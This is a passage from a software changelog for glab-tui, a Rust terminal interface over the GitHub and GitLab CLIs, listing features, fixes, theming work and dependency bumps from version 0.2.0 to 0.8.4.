- **Shared UI helpers** — Consolidated badge styling logic into `badge_style_for` and dialog text wrapping into `wrap_text` (#340, #341).
- **Dependencies** — Bumped `async-trait` to 0.1.92 (#329).

---

## [0.8.4] - 2026-08-13

### Bug Fixes
- **Theme-safe syntax highlighting** — The diff view's syntax highlighting no longer hardcodes a fixed syntect palette. `highlight_line_syntax` now derives the highlighting theme from the active app theme (`text_normal` foreground on the theme `bg`) and strips all syntect scope colors, so highlighted code always matches the active theme — including custom and light themes — and the reset theme is no longer serialized into saved configs (#313).
- **GitHub Enterprise backend detection** — Backend detection now parses the remote host and, for non-`github.com` hosts, probes both `gh auth status --active --hostname <host>` and `glab auth status --hostname <host>`. A new repo-local `backend = "github" | "gitlab"` config key overrides automatic detection for ambiguous remotes (SSH aliases, hosts serving both platforms), and the shared detection logic is now used at startup, in the repo switcher, for diff review submission, and by `doctor` (#312).
- **Milestone progress rendering** — `glab milestone list` now passes `--project`/`--group` (the previous `-R` flag was silently ignored, leaving the Milestones tab empty), and milestone issues are fetched by milestone **title** instead of iid — fixing the progress column and "Issues Status" detail stuck at 0%. Stale empty milestone-issue cache entries no longer block a re-fetch, and fetch errors surface through the failure toast instead of silently substituting an empty list (#303).
- **Merge MRs without prompting (GitLab)** — `glab mr merge` runs with `--yes` so the TUI never hangs on the CLI's interactive confirmation, and multiple selected MRs can be merged in sequence from the merge-options selector (#310).
- **Draft/Ready status editing** — The MR/PR edit-menu status field now actually applies the change (updates the local row and calls the backend toggle) instead of silently discarding it, and the field is available for GitHub PRs as well (#308).
- **Help overlay polish** — `q` is consumed by the help search input instead of quitting or closing the overlay, and the help screen now separates "Quit program" (the remappable quit key) from "Close active overlay" (`Esc`) (#309, #311).

### Maintenance
- **Dependencies** — `clap` bumped `4.6.4` → `4.6.6` (#307).
- **CI** — pinned Actions refreshed: `dtolnay/rust-toolchain` and `Swatinem/rust-cache` `2.9.1` → `2.9.2` (#305, #306).

---

## [0.8.3] - 2026-08-04

### Features
- **Real label colors from the API** — The Labels column now renders each label with its actual color returned by `glab label list` / `gh label list` (hex, normalized and persisted in the offline cache). GitHub-style background-fill colors that are too light to read as foreground text automatically fall back to the theme palette, which now ships full 10-entry palettes across all 16 bundled themes. A new `fetch_label_colors` config option (default `true`) switches back to always using the theme palette (#295).
- **Complete theme coverage** — Every remaining hardcoded RGB value was replaced with semantic theme tokens so all surfaces honor the active theme: the diff view (unified and side-by-side addition/deletion lines, gutters, separators, empty panes, draft/current comment overlays, file-tree stats), markdown rendering (headings, list bullets, blockquotes, code), and the diff selection/search-match highlight backgrounds (#295).

### Bug Fixes
- **Windows CI test race** — Unit tests that mutate process-global environment variables (config paths, cache dirs) are now serialized on a shared `config::TEST_ENV_MUTEX`, eliminating an intermittent `page_size` assertion failure on Windows where one test's `GLAB_TUI_CONFIG` mutation leaked into another test's `Config::load()` (#296).

### Maintenance
- **Release tooling** — `scripts/release.sh` gained animated spinner and progress-bar helpers: preflight checks, release builds, demo-GIF generation, PR-merge polling, and the branch push now run with a live spinner and captured logs (auto-disabled when not a TTY), and release phases are numbered (`1/7` …) for clearer progress reporting (#296).
- **Documentation** — README package-manager version badges (crates.io, GitHub releases, Homebrew, Scoop, Docker) consolidated into the header badge row, and the Homebrew badge re-pointed at the main repo's release tags (the tap repo publishes no releases of its own).
- **Dependencies** — `toml` bumped `1.1.3` → `1.1.4` (#292); CI Actions `docker/login-action` `4.5.2` → `4.6.0` (#293) and `actions/stale` `10.4.0` → `11.0.0` (#294).

---

## [0.8.2] - 2026-08-02

### Features
- **MR/PR review state at a glance** — The MR/PR table now surfaces **Approval** (`CHG`/`CHANGES`, `AWAITING`, `APPROVED`, `REVIEW REQ`), **Mergeable** (`CONFLICT`, `REBASE`, `CLEAN`, `CHECKING`), and **Workflow** (`Returned`, `Review req`, `Yours`, `Approved`, `By others`, `Inactive`) columns with color-coded icon badges, reordered so the status indicators sit together at the front of the table. GitLab state comes from a single bulk GraphQL query; GitHub derives it from the native `gh pr list` review/merge fields. Pending approvals repeat one icon per approval still needed, and GitLab's `blocking_discussions_resolved` flag is surfaced alongside (#270, #274).
- **Rebase & revoke approvals** — `R` rebases the source branch onto the target on both hosts (gated by mergeability: conflicted MRs must be resolved locally, already-clean MRs are skipped), and `A` revokes your approval on GitLab (`gh` has no revoke path) — both behind the standard confirm popup (#270).
- **Filter picker aligned with the table** — Value-based column filter selectors now show the exact text the table renders (`OPEN`/`CLOSED`, `CONFLICT`/`REBASE`/`CLEAN`, `SUCCESS`/`FAILED`, …). Legacy lowercase values already saved in `config.toml` or the cache keep working through automatic `normalize_filter_value()` normalization (#274).
- **`api_per_page` configuration** — New `api_per_page` key bounds the per-request response size (clamped to GitLab's accepted `1–100` `per_page` range) for issues, MRs, pipelines, and labels — a workaround for GitLab instances that truncate large JSON response bodies (#269, #272).
- **Rosé Pine themes** — Three new bundled presets: `rose-pine`, `rose-pine-moon`, and `rose-pine-dawn` (16 bundled themes total) (#278).
- **Theme polish** — The root canvas background is now painted for every theme, the `default` and `clean` presets use pure black backgrounds, and the light-theme demo GIF was re-recorded. The hardcoded in-code fallback theme was removed: `Theme::default()` now derives directly from `src/themes/default.toml`, so the bundled TOML is the single source of truth (#282).

### Bug Fixes
- **Milestone removal & attribute clearing** — Milestones can now be removed (empty / `None` selector value) and attributes cleared from the edit menu and bulk updates, and the premature tab-refresh race after edit submission was eliminated (#281).
- **Cached filter compatibility** — Pre-existing saved column filters stored with the old lowercase display values are normalized transparently, so no config or cache migration is required after upgrading (#274).
- **Overlay & diff view backgrounds** — Popup overlays (edit menus, selectors, confirm dialogs, column filters) and the diff view now paint the active theme background instead of resetting to the terminal default color, so every surface renders consistently with the chosen theme on terminals whose default background differs from `bg`.

### Maintenance
- **Release tooling** — `scripts/release.sh` now interactively selects the opencode model (provider → model → variant) used for regenerated docs and release notes, via `fzf` with a numbered-menu fallback; set `OPENCODE_MODEL` to skip the prompt (#283).
- **Test robustness** — `workflow_dispatch` input parsing now tests against an inline fixture instead of reading a repository workflow file (#271); new unit tests cover MR keybinding collision detection, bundled-theme parsing, `api_per_page` clamping, MR state derivation, and filter normalization.
- **Documentation** — Backend docs describe `_per_request` semantics (no-op on GitHub, which paginates via `--limit`), and the generated `config.toml` documents `api_per_page`; the README CI badge now points at `rust.yml` (#272).

---

## [0.8.1] - 2026-07-31

### Fixed
- **Nested GitLab subgroups** — Remote project paths are now parsed by a shared `git_helpers::parse_project_path` that preserves the full namespace path instead of truncating to the last two segments. Projects in nested subgroup namespaces (e.g. `group/subgroup/project`) on self-hosted GitLab no longer fail with "Project Not Found"; the parser also handles `ssh://` URLs, explicit ports, and embedded credentials, and the offline cache is keyed identically (#256).
- **Review submission popup** — Submitting a review with pending draft comments now uses the standard confirmation popup with styled `[ YES ]` / `[ NO ]` buttons (`h`/`l` to toggle, `Enter`/`y` to confirm, `n`/`Esc` to cancel) instead of the bare `y`/`n` keybinds, consistent with every other destructive action (#247, #248).
- **Pipeline creation with variables** — Fixed the `glab ci run` flag name (`--variable` → `--variables`) and stopped passing `--mr` when custom variables or `workflow_dispatch` inputs are set, so pipelines triggered with variables/inputs now run correctly (#258).
- **Release build caching** — `rust-cache` is skipped on release tag builds to avoid restoring stale caches, and the git identity is configured before the Homebrew/Scoop manifest commits (#260, #264).

### Changed
- **Local-first release orchestration** — All release automation consolidated into a single `scripts/release.sh` orchestrator: preflight checks, version bump, doc and demo-GIF regeneration via headless `opencode`, a `chore: prepare release` PR with a review gate, squash-merge and tag, release build wait, release notes with contributor attribution, Homebrew/Scoop manifest sync, GHCR image push, and crates.io publish. The `prepare-release` and `post-release` workflows were removed; `release.yml` now only builds the cross-platform binary matrix.
- **CI hardening** — All third-party GitHub Actions pinned to commit SHAs (versions kept as comments for update tooling) so no step can be re-pointed to unreviewed code; `dtolnay/rust-toolchain` now takes an explicit `toolchain` input (#250).
- **Filtering & keybinding documentation** — README expanded with a Filtering, Grouping & Columns walkthrough and complete per-tab keybinding tables (including the remappable `config.toml` key for every binding); the in-app `?` help overlay surfaces the configure/filter workflow, and stale shortcuts (pipeline artifact download, milestone `J`/`K`) were removed (#261).
- **Dead code removal** — Removed the unused `KeybindingPipelines.download_artifact` config key (no handler exists; `d` cancels) and the never-invoked `handle_entity_update` function along with its now-unused imports (#261).
- **Demo GIFs** — Restored the original higher-quality demo recordings, reverting the earlier GIF compression.

---

## [0.8.0] - 2026-07-26

### Added
- **Mouse support** — Click to navigate and interact with all overlays, modals, sidebar tabs, and table scrolling via mouse events. Includes parameterized selector click handlers and backend-aware confirm popup interactions (#216, #227, #228).
- **Bulk editing** — Select multiple issues or merge requests and apply batch operations (close, reopen, label, assign) in a single action (#215, #230).
- **Create MR/PR from issue** — Press `m` on a selected issue to instantly create a merge/pull request from it, with automatic branch creation and push (#185, #229).
- **CLI subcommands** — New `doctor` and `clean-cache` subcommands for system diagnostics and cache management, implemented with `clap` derive (#178, #237).
- **Todos/Notifications tab overhaul** — Badges, relative `time_ago` timestamps, an explicit Updated column, and fuzzy search across all todo columns (#158, #239).
- **Milestone visual progress bar** — Replaces plain percentage text with a rendered progress bar in the milestones table column (#161, #238).
- **Configurable sidebar and terminal pane** — New `UiConfig` section in `config.toml` lets users set sidebar width and toggle sidebar/terminal pane visibility (#223).
- **Edit menu mnemonics footer** — Keybinding hints displayed at the bottom of edit menus for quick reference (#220).
- **Pipeline search and group-by** — Filter and group pipelines by Name, Event, SHA, and Actor columns (#221).
- **Run pipeline dialog** — Gated on backend availability with appropriate messaging when the feature is not supported (#222).
- **Related pipelines from MR detail** — Press `P` in MR detail view to list pipelines associated with the selected merge request (#212).
- **Manual GitLab job start** — Press `S` to start manual (blocked) GitLab CI jobs from the job view (#214).
- **Unified Modal component** — Reusable double-bordered modal widget for consistent overlay rendering (#210).
- **Auto-dismiss error toasts** — Error messages render as timed notification toasts instead of persistent overlays (#211).
- **BackendKind enum** — Runtime backend identification (`BackendKind::GitLab` / `BackendKind::GitHub`) with terminology helpers (`term()`) for host-aware UI strings (#206).
- **Semantic theme tokens** — Label palette, clean preset, and expanded color token system for finer-grained UI theming (#207).
- **workflow_dispatch inputs** — Detects and prompts for `workflow_dispatch` inputs when triggering GitHub Actions pipelines.
- **Performance optimizations** — Cached repo attributes, reduced over-fetching of unchanged data, and streamlined mutation handlers (#240).

### Fixed
- **GitHub PR draft toggle** — Fixed `gh pr edit --draft` (invalid command) → `gh pr ready --undo` for marking PRs as draft.
- **Help overlay completeness** — All missing keybindings now documented; overlay switched from hardcoded to config-backed rendering (#236).
- **Cache staleness** — Milestone issues no longer served stale; GitHub branch metadata correctly fetched (#235).
- **Quote stripping** — `extract_quotes` now only strips outer matching quote pairs instead of all quotes (#234).
- **Mouse click targeting** — Selector click handler properly accounts for search bar and footer height; search bar presence detected from `field_type` (#227).
- **Confirm popup with mouse** — Backend methods used for confirm action execution; event-sending bugs resolved (#227).
- **Keybinding modifier keys** — Bare `KeyCode` checks added for uppercase `P` and `S` modifiers to prevent conflicts (#227).
- **Pipeline keybinding wiring** — `view_related_pipelines` and `start_job` keybindings properly routed to their handlers.
- **Responsive column widths** — Table columns now adapt gracefully on 80-col terminals (#224).
- **Confirm popup and pipeline detail** — Missing confirm popup handling and pipeline detail adaptations restored (#219).
- **Milestone terminal output** — Unified close/reopen command output to prevent terminal corruption (#218).
- **GitHub job stage name** — Uses workflow name instead of raw job identifier for GitHub Actions stage column (#213).
- **GitLab milestone fixes** — Corrected milestone update and deletion behavior.

### Changed
- **In-terminal hints removed** — All inline status hints removed from the UI; functionality consolidated into the help overlay (`?`) (#226).
- **Edit menu terminology** — Standardized field labels using the new `FieldType` enum (#225).
- **Terminology extraction** — Hardcoded host-aware strings (Merge Request / Pull Request, Pipeline / Action, Todo / Notification) moved into `BackendKind::term()` for single-source-of-truth (#206).
- **CI release automation** — Submodules (`Formula/`, `scoop/`) removed; `post-release.yml` now updates Homebrew and Scoop manifests directly instead of dispatching to submodule repos.

### Dependencies
- Add `clap` 4 (with `derive` feature) — CLI argument parsing for subcommands
- Add `serde_yaml` 0.9 — YAML support for `doctor` diagnostics output

---

## [0.7.0] - 2026-07-20

### Added
- **Backend trait system** — Extracted a unified `Backend` trait (`src/backend/mod.rs`) with dedicated `GlabBackend` (`src/backend/glab.rs`) and `GhBackend` (`src/backend/gh.rs`) implementations, replacing the old `src/gitlab/` translation layer. The trait provides ~40 methods covering all API interactions with proper async dispatch (#165).
- **Domain model layer** — Consolidated domain types into `src/domain/` with clean modules for `branches`, `deployments` (Environment & Deployment), `issues`, `milestones`, `mr`, `notifications`, `pipelines`, `releases`, and `runners`, each with serde-powered structs and dedicated list/get helpers.
- **crates.io publishing** — Package renamed to `glab-tui-crate` (binary stays `glab-tui`) for publishing on crates.io; `cargo install glab-tui-crate` now works.
- **Homebrew & Scoop distribution** — Added `.gitmodules` for `homebrew-glab-tui` and `scoop-glab-tui` manifest repos, with CI automation to update formulas on release.
- **`async-trait` dependency** — Added `async-trait = "0.1.89"` to support the new async `Backend` trait.

### Fixed
- **is_draft detection** — Fixed draft status not being correctly parsed from GitLab MR responses.
- **GitLab nerd font icons** — Replaced custom nerd font GitLab icon with standard FontAwesome icon for better cross-terminal compatibility.
- **Repository argument encoding** — Removed spurious URL encoding from `glab` native subcommand `-R` arguments, fixing entity fetch failures when project paths contain special characters (#181).
- **Non-blocking CLI commands** — Reverted to non-blocking subprocess spawning to prevent UI freeze during CLI calls (#183).
- **Diff rename handling** — Fixed diff parsing when files are renamed, ensuring renamed file diffs are displayed correctly (#184).
- **Terminal output corruption** — Resolved extraneous printouts corrupting the terminal display (#173).
- **Trace view regression** — Fixed the job trace viewer that was not displaying output (#172).
- **Code injection mitigation** — Applied escaping fixes for CodeQL security alert #25 (shell argument injection) (#168).
- **macOS CI hangs** — Prevented `cargo test` from hanging on macOS runners by fixing PTY lifecycle.
- **Duplicate release notes** — CI now generates release notes only once in the matrix build.

### Changed
- **Architecture overhaul** — Removed the entire `src/gitlab/` module tree (client.rs, issues.rs, mr.rs, pipelines.rs, runners.rs, releases.rs, milestones.rs, notifications.rs, branches.rs, deployments.rs). Replaced with `src/backend/` (trait + per-host impls) and `src/domain/` (data types + logic). The `GitlabClient` now lives in `src/domain/client.rs` and delegates to the backend trait.
- **Package identity** — Cargo package renamed from `glab-tui` to `glab-tui-crate` to free the `glab-tui` name for the binary. The install command changes to `cargo install glab-tui-crate`.
- **Release automation** — CI `release.yml` now triggers manifest updates on Homebrew and Scoop submodules after a release publish.

### Dependencies
- Bump `toml` from `0.8` to `1.1.3+spec-1.1.0`
- Bump `tokio` from `1.52.3` to `1.53.0` (minor-updates group)
- Add `async-trait` `0.1.89`
- Bump `the patch-updates group` with 4 dependency updates
- Bump `docker/login-action`, `docker/build-push-action`, `actions/checkout` (CI)

---

## [0.6.0] - 2026-07-11

### Added
- **Nerd Font icon system** — All tab titles, status badges, labels, and UI indicators can now render nerd font icons. Uses hardcoded nerd font defaults that are not user-configurable. (original #156)
- **Pipeline / Action status in MR/PR pane** — The MR/PR details panel now displays the pipeline (GitLab) or workflow action (GitHub) status graphically with stage dots, adapting terminology to the remote host (#144, #126).
- **Confirmation prompts for destructive actions** — Closing issues, closing MRs, merging MRs, and deleting branches/releases/milestones now show a confirmation dialog before executing. Reduces accidental destructive operations (#141, #146).
- **Entity deletion** — Issues and merge requests can now be deleted directly from the TUI. New `delete_entity` keybinding added to the issues and MRs keybinding tables (#150).
- **Fetchable selectors for free-form fields** — Branch inputs, environment selectors, and other free-form fields were upgraded to fetchable `Selector` lists with fuzzy matching, matching the selector UX used elsewhere (#145).
- **Improved cache persistence** — Selector items and milestone issues are now persisted to disk cache alongside API payload data, reducing redundant network fetches on tab switches (#147).

### Fixed
- **Column widths bounded** — All table columns now use fixed `Length` constraints instead of `Fill`, guaranteeing every column stays within the terminal viewport. Affects issues, MRs, pipelines, jobs, runners, releases, todos, milestones, branches, and environments (#125, #155).
- **Config auto-create removed** — `Config::load()` no longer writes `config.toml` on startup when missing. The file is now created only by an explicit `save_view` / `save_layout` action, aligning with the documented behavior (#74daa1b).
- **Homebrew installation** — Fixed wrong version pinning and corrected the installation method in the Homebrew formula (#148).
- **E2E test deadlocks** — Resolved deadlocks in parallel PTY spawning by preparing process allocations before forking; refactored `test_cascading_repo_override` to use `Pty::spawn` (#fcb16b3, #4118699).
- **Install script asset matching** — `install.sh` now matches exact asset names to avoid downloading multiple release URLs (#c6acf24).

### Changed
- **Tab titles** — Now include nerd font icons (e.g., ` Issues`, ` PRs`, ` Pipelines`/` Actions`). Falls back gracefully on non-nerd-font terminals via config override.
- **Pipeline column in MRs** — Renamed to "Pipeline" on GitLab, "Action" on GitHub, gated by host detection.
- **Confirmation UX** — `ConfirmAction` enum expanded with `DeleteBranch`, `DeleteIssue`, `DeleteMr`, `CloseIssue`, `CloseMr`, `MergeMr` variants; new `confirm_popup_selected_yes` state field.

### Dependencies
- Bump `docker/login-action` from 3 to 4 (CI)
- Bump `docker/build-push-action` from 6 to 7 (CI)

---

## [0.5.0] - 2026-07-07

### Added
- **Save view configurations** — Inline page size editing, multi-page fetching, and config persistence validation in the configuration view (#142).
- **Milestone tracker & editing** — Support editing milestone fields, color-coded progress bars, caching milestone issues to avoid redundant network fetches, and dynamically rendering milestones column headers (#106, #110, #140).
- **Release creation & editing** — Support structured release creation and editing via `EditMenu`, along with commit metadata and assets link rendering in the release preview (#106, #110).
- **Issue, MR, and PR description templates** — Choose from description templates when creating new issues or merge/pull requests (#123).
- **Fuzzy matching improvements** — Upgrade pipelines, jobs, and branch/workflow selectors to use `SkimMatcherV2` fuzzy matching, matching the merge request list (#103).
- **Run pipeline workflow/branch selectors** — Autocomplete and search local/remote branches and CI configuration files when triggering pipelines (#103).
- **Packaging and manifests** — Add Docker container support, Scoop, and Homebrew formula packages with manifest auto-bumping utilities (#107).

### Fixed
- **GitHub PR Ready** — Use correct `gh pr ready` subcommand instead of the invalid `gh pr edit --ready` flag when marking GitHub PRs ready (#103).
- **Runner details panel** — Hide details pane if not applicable/empty (#109).
- **UTF-8 characters in labels** — Prevent panic on label truncation with multi-byte characters by ensuring truncation snaps down to character boundaries (#93).

### Changed
- Reordered Date column to the left of Release Name in the releases table.
- Moved collapse/expand matrix hint from jobs pane to help view.

---

## [0.4.0] - 2026-07-02

### Added
- **TOML config file** — `~/.config/glab-tui/config.toml` (or `$GLAB_TUI_CONFIG`) auto-generated on first run with all options documented inline.
- **Theme system** — choose from six bundled presets (`default`, `tokyo-night`, `gruvbox`, `nord`, `catppuccin-mocha`, `dracula`) via `theme_preset` in config; full per-color overrides supported under `[theme]`.
- **Custom theme files** — place additional `<name>.toml` files in `~/.config/glab-tui/themes/` to create and share your own themes.
- **Fully configurable keybindings** — every action across all panes is remappable in `config.toml` under `[keybindings.global]`, `[keybindings.issues]`, `[keybindings.mrs]`, `[keybindings.pipelines]`, and `[keybindings.releases]`.
- **Interactive calendar date picker** — press `Enter` on Due Date / Start Date in the edit menu to open an inline calendar widget; navigate with `h`/`l` (month) and `j`/`k` (day).
- **Due Date column in Issues** — new `Due Date` column in the issues table; hidden automatically when connected to GitHub.
- **Start Date column in Milestones** — new `Start Date` column; hidden automatically when connected to GitHub.
- **Runner details panel** — selecting a runner now opens a structured side-panel showing Runner ID, description, status, tags, and live job/queue metrics.
- **Per-pane column config in TOML** — set default visible columns, column filters, and group-by column persistently via `[issues]`, `[mrs]`, etc. sections in `config.toml`.

### Fixed
- **Small terminal handling** — gracefully degrade layout when the terminal is too small rather than panicking.
- **Pipeline job cache persistence** — pipeline jobs are now saved to and restored from disk cache.
- **Selector "Create New" entry** — always appears at the top of the list even when a filter is active.
- **Empty description on GitHub** — creating issues/MRs on GitHub no longer inserts a blank description field.
- **GitLab-only fields hidden on GitHub** — due date, weight, confidential, and start-date fields are excluded from GitHub issue/MR forms.
- **`Ctrl+E` to open editor** — unified shortcut to open `$EDITOR` for description fields across all edit menus.

### Changed
- **Config architecture refactor** — keybindings, column visibility, and themes were extracted from hard-coded constants in `ui.rs` into a dedicated `config.rs` module; `FormattingConfig` struct removed.
- **Keybinding matching** — all hardcoded `KeyCode::Char` match arms replaced with `keybinding_matches()` helper, enabling full runtime override from `config.toml`.
- **Edit menu UI polish** — edit popup border and title rendered in focused accent color; field values colored to match the details pane; date picker styled to match the details pane theme.
- **`cancel` pipeline keybinding** — default changed from `c` to `d` (resolves conflict with `download_artifact`, which was also `d`).
- **Runner tab layout** — rebuilt runner details rendering: removed old flat list in favor of a structured two-pane layout (table + details panel).

### Dependencies
- Bump `anyhow` from `1.0.98` to `1.0.103`
- Bump `ratatui` from `0.30.1` to `0.30.2`
- Bump `actions/checkout` from 4 to 7 (CI)
- Bump `actions/stale` from 9 to 10 (CI)

---

## [0.3.0] - 2026-06-13

### Added
- **Code review system** with draft comments, multi-line comments, and code suggestions in diff view.
- **Syntax highlighting** in diff/patch viewer using `syntect` (`base16-eighties.dark` theme).
- **Side-by-side diff layout** — toggle between unified and side-by-side with `d` in diff view.
- **Value-based column filtering** — filter table rows by specific column values via configure popup.
- **Column grouping & ordering** — merge grouping into configure view with ascending/descending sort.
- **Show read notifications** — toggleable via `show_read` parameter on todos/notifications tab.

### Fixed
- **ID sorting** — compare ID columns numerically instead of lexicographically.
- **Diff contextual naming** — show "Pull Request" or "Merge Request" based on host, not both.
- **Review pane focus** — focus files pane on Esc, confirm drafts when closing diff.
- **Line range selection** — correct line range and comment target on side-by-side diff.
- **UI rendering alignment** — align with sorted lists, resolve borrow checker conflict.
- **Row selection in grouping view** — restore normal selection, editing, and column toggling.
- **Group map rebuild** — rebuild group map and update filters when toggling columns.
- **Layout scaling** — fix layout scaling issues (#71).
- **POST for retry/cancel** — use `-X POST` for retry and cancel endpoints (#49).
- **Editor-based comments** — fix comment creation via editor (#38).
- **`--file-path` flag** — use for `glab mr note create`.
- **Description template** — hide from EditMenu, load on demand when editing.
- **Notification command args** — fix `gh api notifications?all=true` argument passing.

### Changed
- **Refactored column configure popup** — replaced old FILTERS section with unified COLUMNS, GROUP BY, and ORDER sections.
- **Contextual column renaming** — milestones: rename `IID` column to `ID`.
- **Cache directory migration** — moved from `~/.glab-tui-cache` to `~/.cache/glab-tui`.
- **Extended cache persistence** — now saves `enabled_columns`, `group_by_column`, `group_ascending`, `column_filters`.
- **Event refactoring** — `DiffFetched` changed from tuple struct to named fields with `comments` payload.
- **GitHub endpoint translation** — added `/retry`→`/rerun`, `/notes`→`/comments` maps; pull request comment JSON translation.

### Dependencies
- Bump `ratatui` from `0.29.0` to `0.30.1`
- Bump `crossterm` from `0.28.1` to `0.29.0`
- Bump `chrono` from `0.4.44` to `0.4.45`
- Add `syntect` v5 with `default-fancy` features

### CI/CD
- Bump `codecov/codecov-action` from v4 to v7
- Bump `actions/upload-artifact` from v4 to v7
- Bump `actions/labeler` from v5 to v6
- Bump `amannn/action-semantic-pull-request` from v5 to v6
- Bump `softprops/action-gh-release` from v2 to v3

## [0.2.1] - 2026-06-07

### Added
- **New MR creation from issue**: Branch selector with auto-create, slug-based source branch, auto-push before PR creation.
- **Reopen/close issues and MRs.**
- **Persistent offline caching** for all data tabs (issues, MRs, pipelines, runners, releases, todos, milestones).
- **1-minute auto-refresh** of the active tab.
- **Inline command logs** and a scrollable **Terminal tab** showing CLI command history.
- **Creation forms** for issues, MRs, and pipeline triggers.
- **Edit menus** with `$EDITOR` integration for descriptions and freeform fields.
- **Pipeline/JD job trace viewer** with scroll support and open-in-editor.
- **Self-updater** via `--update` / `-u` flag (GitHub releases).
- **Security audit** CI workflow (`cargo audit`).

### Fixed
- UI table overflow: main content pane now respects the terminal pane's reserved height.
- Windows: `NamedTempFile` handle locking — editor temp files use `into_temp_path()` to release the handle before spawning.
- Windows: removed `cmd /c` wrapper from editor spawn — Rust's command-line builder was double-escaping path quotes.
- GitHub mode: labels, milestones, description editing, and PR-from-issue creation.
- Fuzzy search: disabled fuzzy matching on all tabs except MRs; "Create New" option moved to top of selector.
- Self-updater: works correctly on both Linux and Windows.
- Various UI panics on empty lists, ellipsis padding, and rendering edge cases.

### Changed
- Refactored editor integration: extracted `Cli` / `UpdateCmd` helper structs for clean GitHub/GitLab CLI flag mapping.
- CI workflows now trigger only on `main` (dev branch triggers removed post-merge).

## [0.2.0] - 2026-06-03

### Added
- **Dual-Engine GitHub & GitLab Support**: glab-tui now automatically detects if a project is hosted on GitHub or GitLab, translating TUI views and actions to `gh` or `glab` CLI commands under the hood.
- **CLI Configuration Options**: Added option flags `--repo <namespace>` (to override project context) and `--dir <path>` (to target a custom repository directory) on launch.
- **Columns Config Modal Overlay**: Replaced the sidebar panel with a centered columns checkbox toggler popup overlay, triggered by pressing `Tab` or `,`.
- **Hashed Multi-colored Labels**: Implemented individual label coloring based on a hashed color scheme in the Issues and Merge Requests tables, preserving fuzzy-search query highlights.
- **Runner Diagnostics Dashboard**: Integrated simulated performance statistics, utilizing gauges, utilization percentages, queue depths, and average queue wait times.

### Changed
- Expanded the Navigation sidebar pane to take full vertical height when columns config panel is hidden.
- Updated the Keyboard Shortcuts help menu to reflect the new `Tab` / `,` column toggle binding.
- Auto-formatted and cleaned up import structures across all code modules to fix compiler lint warnings.
